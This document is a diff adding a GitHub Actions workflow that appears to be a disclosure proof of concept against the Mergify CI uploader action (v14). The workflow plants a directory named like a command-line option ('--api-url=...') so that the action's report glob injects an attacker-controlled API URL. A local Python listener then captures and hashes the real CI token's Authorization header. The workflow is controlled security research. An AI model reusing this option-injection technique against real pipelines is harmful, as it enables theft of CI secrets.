@@ -1,0 +1,68 @@
+name: VM5 v14 live CI key boundary
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Secretless project step plants option-like JUnit path
+        shell: bash
+        run: |
+          if [ -n "${MERGIFY_TOKEN:-}" ]; then
+            echo "VM5_PRESTEP_TOKEN_PRESENT=1"
+            exit 91
+          fi
+          echo "VM5_PRESTEP_TOKEN_PRESENT=0"
+          mkdir -p -- '--api-url=http:127.0.0.1:18777' reports
+          cat > reports/junit_x.xml <<'XML'
+          <testsuite name="vm5-live" tests="1" failures="0"><testcase classname="vm5" name="pass"/></testsuite>
+          XML
+          cp reports/junit_x.xml './--api-url=http:127.0.0.1:18777/junit_x.xml'
+          cat > /tmp/v14_listener.py <<'PYLISTENER'
+          from http.server import BaseHTTPRequestHandler, HTTPServer
+          import hashlib
+          class H(BaseHTTPRequestHandler):
+              def do_POST(self):
+                  n=int(self.headers.get('content-length') or 0)
+                  if n: self.rfile.read(n)
+                  auth=self.headers.get('authorization') or ''
+                  open('/tmp/v14_auth.sha256','w').write(hashlib.sha256(auth.encode()).hexdigest())
+                  self.send_response(404)
+                  self.send_header('content-type','application/json')
+                  self.end_headers()
+                  self.wfile.write(b'{"detail":"controlled VM5 live-key capture"}')
+              def log_message(self,*args): pass
+          HTTPServer(('127.0.0.1',18777),H).handle_request()
+          PYLISTENER
+          unset RUNNER_TRACKING_ID
+          nohup python3 /tmp/v14_listener.py >/tmp/v14_listener.log 2>&1 &
+          echo "VM5_LISTENER_STARTED=1"
+      - name: Dashboard recommended v14 uploader with real CI key
+        continue-on-error: true
+        uses: mergifyio/gha-mergify-ci@v14
+        with:
+          action: junit-process
+          token: ${{ secrets.MERGIFY_TOKEN }}
+          report_path: "**/junit*.xml"
+      - name: Verify real CI key capture by SHA only
+        if: always()
+        shell: bash
+        env:
+          EXPECTED_AUTH_SHA256: d543f5a9bc75c59b5f92cf387b0ebf2da1a54b9c733f23dbd6f5e7696927137c
+        run: |
+          for i in $(seq 1 30); do
+            [ -s /tmp/v14_auth.sha256 ] && break
+            sleep 1
+          done
+          test -s /tmp/v14_auth.sha256
+          ACTUAL="$(cat /tmp/v14_auth.sha256)"
+          if [ "$ACTUAL" = "$EXPECTED_AUTH_SHA256" ]; then
+            echo "VM5_V14_REAL_CI_KEY_CAPTURE=1"
+          else
+            echo "VM5_V14_REAL_CI_KEY_CAPTURE=0"
+            echo "actual_sha256=$ACTUAL"
+            exit 92
+          fi
